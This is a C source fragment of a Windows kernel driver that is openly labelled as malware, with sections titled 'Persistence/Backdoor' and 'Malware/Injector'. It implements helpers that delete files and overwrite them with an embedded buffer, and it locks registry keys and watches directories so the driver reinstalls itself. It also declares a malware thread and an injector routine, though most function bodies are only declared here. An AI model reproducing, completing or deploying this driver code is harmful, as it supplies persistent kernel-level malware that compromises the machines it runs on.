	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

};

// Persistence/Backdoor core stuff

typedef NTSTATUS( NTAPI* _NtLockRegistryKey )(

	_In_ HANDLE KeyHandle

);

_NtLockRegistryKey NtLockRegistryKey;

typedef NTSTATUS ( NTAPI* _NtNotifyChangeDirectoryFile )(

	_In_ HANDLE, 
	_In_ HANDLE,
	_In_ PIO_APC_ROUTINE,
	_In_ PVOID,
	_Out_ PIO_STATUS_BLOCK, 
	_Out_ PVOID,
	_In_ ULONG,
	_In_ ULONG,
	_In_ BOOLEAN

);

_NtNotifyChangeDirectoryFile NtNotifyChangeDirectoryFile;

IO_STATUS_BLOCK g_IoStatusBlock;

BOOLEAN compare_unicode_string_2(
	
	_In_ const WCHAR* wchWintapixName,
	_In_ const WCHAR* wchFileName,
	_In_ ULONG fileNameLength

) {

	UNICODE_STRING uniStrCurrentFileName;
	UNICODE_STRING uniStrFileName;

	memset( _Out_ &uniStrFileName, _In_ 0, _In_ sizeof( uniStrFileName ) );

	memset( _Out_ &uniStrCurrentFileName, _In_ 0, _In_ sizeof( uniStrCurrentFileName ) );

	RtlInitUnicodeString( 
		
		_Out_ &uniStrFileName,
		_In_ wchWintapixName
	
	);
	
	RtlInitUnicodeString(
		
		_Out_ &uniStrCurrentFileName,
		_In_ wchFileName
	
	);

	uniStrCurrentFileName.Length = ( USHORT )fileNameLength;

	return RtlCompareUnicodeString(
		
		_In_ &uniStrFileName,
		_In_ &uniStrCurrentFileName,
		_In_ 1

	) == 0;
}

NTSTATUS delete_file(
	
	_In_ const WCHAR* wchFileName

) {

	UNICODE_STRING uniStrFileName;

	OBJECT_ATTRIBUTES ObjectAttributes;

	RtlInitUnicodeString(
		
		_Out_ &uniStrFileName,
		_In_ wchFileName
	
	);

	ObjectAttributes.Length = 48;
	ObjectAttributes.RootDirectory = 0i64;
	ObjectAttributes.Attributes = 64;
	ObjectAttributes.ObjectName = &uniStrFileName;
	ObjectAttributes.SecurityDescriptor = 0i64;
	ObjectAttributes.SecurityQualityOfService = 0i64;

	return ZwDeleteFile(
		
		_In_ &ObjectAttributes
	
	);
}

NTSTATUS override_file_with_buffer(
	
	_In_ const WCHAR* wchFileName, 
	_In_ void* pBuffer,
	_In_ ULONG szBuffer

) {

	IO_STATUS_BLOCK IoStatusBlock;
	UNICODE_STRING uniStrFileName;
	OBJECT_ATTRIBUTES ObjectAttributes;
	HANDLE hFile;

	memset( _Out_ &IoStatusBlock, _In_ 0, _In_ sizeof( IoStatusBlock ) );

	RtlInitUnicodeString(
		
		_Out_ &uniStrFileName,
		_In_ wchFileName
	
	);
	
	ObjectAttributes.Length = 48;
	ObjectAttributes.RootDirectory = 0i64;
	ObjectAttributes.Attributes = 576;
	ObjectAttributes.ObjectName = &uniStrFileName;
	ObjectAttributes.SecurityDescriptor = 0i64;
	ObjectAttributes.SecurityQualityOfService = 0i64;

	NTSTATUS status = ZwCreateFile(
		
		_Out_ &hFile,
		_In_ 0x40000000,
		_In_ &ObjectAttributes,
		_Out_ &IoStatusBlock,
		_In_opt_ 0,
		_In_ 0x80,
		_In_ 1,
		_In_ 2,
		_In_ 0x20,
		_In_ 0,
		_In_ 0
	
	);

	if ( NT_SUCCESS( status ) ) {
		memset( _Out_ &IoStatusBlock, _In_ 0, _In_ sizeof( IoStatusBlock ) );

		status = ZwWriteFile(
			
			_Out_ hFile,
			_In_ 0,
			_In_ 0,
			_Out_ 0,
			_In_opt_ &IoStatusBlock,
			_In_ pBuffer,
			_In_ szBuffer,
			_In_ 0,
			_In_ 0
		
		);
		
		ZwClose(
			
			_In_ hFile
		
		);
	}

	return status;
}

__int64 query_file_information_get_file_size(
	
	_In_ const WCHAR* wchFileName

);

NTSTATUS create_kernel_mode_file(
	
	_In_ const WCHAR* wchWintapixPath

);

NTSTATUS wrap_read_file(
	
	_In_ const WCHAR* wchFileName,
	_In_ PVOID* pBuffer,
	_In_ SIZE_T* szBuffer

);

NTSTATUS wrap_persistence_thread_main(
	
	_In_ const WCHAR* wchWintapixPath,
	_In_ const WCHAR* wchWintapixPath2,
	_In_ const WCHAR* wchWintapixName

);

void persistence_thread(
	
	_In_ PVOID StartContext

);

NTSTATUS notify_registry_key_change(
	
	_In_ const WCHAR* wchWintapixRegisty

);

NTSTATUS set_registry_key_value_2(
	
	_In_ void* handle,
	_In_ const WCHAR* key,
	_In_ int value

);

NTSTATUS set_registry_key_value(
	
	_In_ void* handle,
	_In_ const WCHAR* key,
	_In_ void* value

);

NTSTATUS garant_driver_run(
	
	_In_ const WCHAR* wchRegistyKey

);

NTSTATUS Lock_Registy_Key(
	
	_In_ const WCHAR* wchRegistyKey

);

NTSTATUS persistence_stuff_main(
	
	void

);

//Malware/Injector core stuff

NTSTATUS SetThreadDelay(
	
	_In_ signed int siDelayTime

);

void ThreadMalware(
	
	_In_ PVOID StartContext

);

NTSTATUS DriverEntry(
	
	_In_ PDRIVER_OBJECT pDriverObject,
	_In_ PUNICODE_STRING pRegistryPath

);

VOID UnloadDriver(
	
	_In_ PDRIVER_OBJECT pDriverObject

);